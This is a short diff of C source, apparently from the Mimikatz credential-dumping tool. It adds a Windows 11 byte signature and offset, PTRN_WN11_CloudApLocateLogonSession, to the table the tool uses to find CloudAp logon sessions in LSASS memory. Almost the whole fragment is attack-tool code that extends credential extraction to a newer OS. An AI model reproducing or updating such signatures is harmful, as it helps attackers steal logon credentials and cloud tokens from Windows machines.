@@ -7,8 +7,10 @@
 
 #if defined(_M_X64)
 BYTE PTRN_WALL_CloudApLocateLogonSession[]	= {0x44, 0x8b, 0x01, 0x44, 0x39, 0x42, 0x18, 0x75};
+BYTE PTRN_WN11_CloudApLocateLogonSession[]	= {0x48, 0x8b, 0xd1, 0x49, 0x3b, 0xc1, 0x75};
 KULL_M_PATCH_GENERIC CloudApReferences[] = {
 	{KULL_M_WIN_BUILD_10_1909,	{sizeof(PTRN_WALL_CloudApLocateLogonSession),	PTRN_WALL_CloudApLocateLogonSession},	{0, NULL}, {-9}},
+	{KULL_M_WIN_MIN_BUILD_11,	{sizeof(PTRN_WN11_CloudApLocateLogonSession),	PTRN_WN11_CloudApLocateLogonSession},	{0, NULL}, {-4}},
 };
 #elif defined(_M_IX86)
 BYTE PTRN_WALL_CloudApLocateLogonSession[]	= {0x8b, 0x31, 0x39, 0x72, 0x10, 0x75};
